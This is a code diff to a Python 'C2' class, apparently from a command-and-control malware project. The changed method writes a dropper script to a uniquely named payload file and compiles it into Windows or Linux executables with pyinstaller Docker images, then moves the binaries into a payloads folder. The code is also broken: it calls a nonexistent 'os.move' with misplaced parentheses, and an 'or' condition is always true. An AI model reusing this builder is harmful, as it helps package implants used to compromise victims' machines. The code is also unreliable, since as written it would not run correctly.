@@ -137,25 +137,23 @@ class C2:
 
         
         system = platform.system()
+        payload_file_name = f"payload-{system}-{uuid.uuid4()}"
 
-        with open("docker-pyinstaller/payload.py", 'w') as f:
+        with open(f"{payload_file_name}.py", 'w') as f:
             f.writelines(dropper)
-
-        with open("docker-pyinstaller/requirements.txt", 'w') as f:
-            f.writelines("""geocoder==1.38.1
-python-socketio==5.11.3
-requests==2.32.3""")
         
         if system == generate:
             print("just pyinstaller")
 
         elif generate == "Windows":
-            result = subprocess.run(f'docker run -v "$(pwd):/src/" cdrx/pyinstaller-windows "pyinstaller -F payload.py"', shell=True, capture_output=True)
+            result = subprocess.run(f'docker run -v "$(pwd):/src/" cdrx/pyinstaller-windows "pyinstaller -F {payload_file_name}.py"', shell=True, capture_output=True)
             print(result)
+            os.move(f"{payload_file_name}.exe"), f"payloads/{payload_file_name}.exe"
 
         elif generate == "Darwin" or "Linux":
-            result = subprocess.run(f'docker run -v "$(pwd):/src/" cdrx/pyinstaller-linux "pyinstaller -F payload.py"', shell=True, capture_output=True)
+            result = subprocess.run(f'docker run -v "$(pwd):/src/" cdrx/pyinstaller-linux "pyinstaller -F {payload_file_name}.py"', shell=True, capture_output=True)
             print(result)
+            os.move(f"{payload_file_name}"), f"payloads/{payload_file_name}"
 
         
         os.remove("__pycache__")
